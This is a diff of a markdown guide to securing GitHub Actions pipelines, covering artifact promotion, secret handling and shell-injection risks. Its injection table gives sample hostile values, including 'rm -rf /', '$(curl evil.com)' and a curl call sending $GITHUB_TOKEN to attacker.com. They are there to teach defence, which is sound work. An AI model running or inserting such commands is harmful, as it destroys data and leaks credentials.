@@ -30,6 +30,7 @@ Build → Publish Snapshot → Test → Promote to Artifact → Deploy
 ```
 
 **Key Principles:**
+
 - Deployed artifact is identical to tested artifact (confidence)
 - Never rebuild in production—only deploy promoted artifacts
 - Never overwrite published artifacts—create new versions
@@ -62,7 +63,7 @@ Enforce clear separation between unapproved code (PRs/branches) and approved cod
 ```yaml
 jobs:
   deploy-prod:
-    environment: production   # branch restriction: main only
+    environment: production # branch restriction: main only
     permissions:
       id-token: write
       contents: read
@@ -112,6 +113,7 @@ jobs:
 ### Secret Management Hierarchy
 
 Prefer in this order:
+
 1. **Cloud secret stores** (Azure Key Vault, AWS Secrets Manager) — fewer rotation points, better auditing
 2. **GitHub Actions secrets** — only for CI-specific values (e.g., GitHub App keys)
 
@@ -138,12 +140,12 @@ When you use context variables directly in `run:` scripts, the shell interprets 
 
 If `github.actor`, PR titles, or similar values contain shell metacharacters, injection can occur:
 
-| Scenario | Malicious Value | Result |
-|----------|-----------------|--------|
-| Command injection | `test; rm -rf /` | Executes arbitrary commands |
-| Command substitution | `$(curl evil.com)` | Executes remote code |
-| Quote escaping | `foo'bar'$(whoami)` | Breaks syntax, executes code |
-| Secret exfiltration | `pass; curl attacker.com?token=$GITHUB_TOKEN` | Leaks credentials to attacker |
+| Scenario             | Malicious Value                               | Result                        |
+| -------------------- | --------------------------------------------- | ----------------------------- |
+| Command injection    | `test; <run arbitrary command here>`          | Executes arbitrary commands   |
+| Command substitution | `$(curl evil.com)`                            | Executes remote code          |
+| Quote escaping       | `foo'bar'$(whoami)`                           | Breaks syntax, executes code  |
+| Secret exfiltration  | `pass; curl attacker.com?token=$GITHUB_TOKEN` | Leaks credentials to attacker |
 
 #### Safe Pattern: Use Environment Variables
 
@@ -167,20 +169,22 @@ If `github.actor`, PR titles, or similar values contain shell metacharacters, in
 
 #### Approach Comparison
 
-| Approach | Usage | Risk Level | Notes |
-|----------|-------|-----------|-------|
-| Direct interpolation | `echo "${{ vars.FOO }}"` | 🔴 Critical | Vulnerable to injection attacks |
-| Env variable assignment | `env: { VAR: ${{ vars.FOO }} }` then `echo "$VAR"` | 🟢 Safe | **Recommended approach** |
-| Single quotes | `echo '${{ vars.FOO }}'` | 🟡 Risky | Prevents some attacks but not all |
+| Approach                | Usage                                              | Risk Level  | Notes                             |
+| ----------------------- | -------------------------------------------------- | ----------- | --------------------------------- |
+| Direct interpolation    | `echo "${{ vars.FOO }}"`                           | 🔴 Critical | Vulnerable to injection attacks   |
+| Env variable assignment | `env: { VAR: ${{ vars.FOO }} }` then `echo "$VAR"` | 🟢 Safe     | **Recommended approach**          |
+| Single quotes           | `echo '${{ vars.FOO }}'`                           | 🟡 Risky    | Prevents some attacks but not all |
 
 #### Key Rules
 
 **✅ Must Do:**
+
 - **Always** assign context values to env variables before using in shell
 - Use double quotes when referencing env variables: `"$VAR"` not `$VAR`
 - Mask sensitive values with `::add-mask::` before use in scripts
 
 **❌ Must NOT Do:**
+
 - Direct interpolation in run commands: `${{ vars.FOO }}`
 - Inline execution of secrets: `${{ secrets.PASS }}`
 - Command substitution with context values: `echo "$(eval ${{ vars.CMD }})"`
@@ -231,6 +235,7 @@ Mask sensitive values before use to prevent accidental exposure in logs.
 Check shared workflows before writing new pipeline code. Shared workflows encode org-wide standards (tool versions, lint checks, security scans) and eliminate maintenance burden.
 
 **How to Reference:**
+
 ```yaml
 uses: footholdtech/actions/.github/workflows/go-test.yml@<commit-sha>
 ```
@@ -242,11 +247,13 @@ Always pin to full commit SHA. Contributing guidelines: [CONTRIBUTING.md](https:
 **Prefer composite actions** for most cases—simplest to read, review, and maintain.
 
 **Action Types:**
+
 - **Composite** - Fastest; for bundling steps or `uses:` references
 - **JavaScript** - Logic-heavy; use `@actions/core` SDK
 - **Docker** - When specific environment/dependencies needed (Linux only, slower)
 
 **Security in Custom Actions:**
+
 - Never interpolate inputs directly: use environment variables instead
 - Mask sensitive values with `echo "::add-mask::$SECRET"`
 - Document required permissions in README
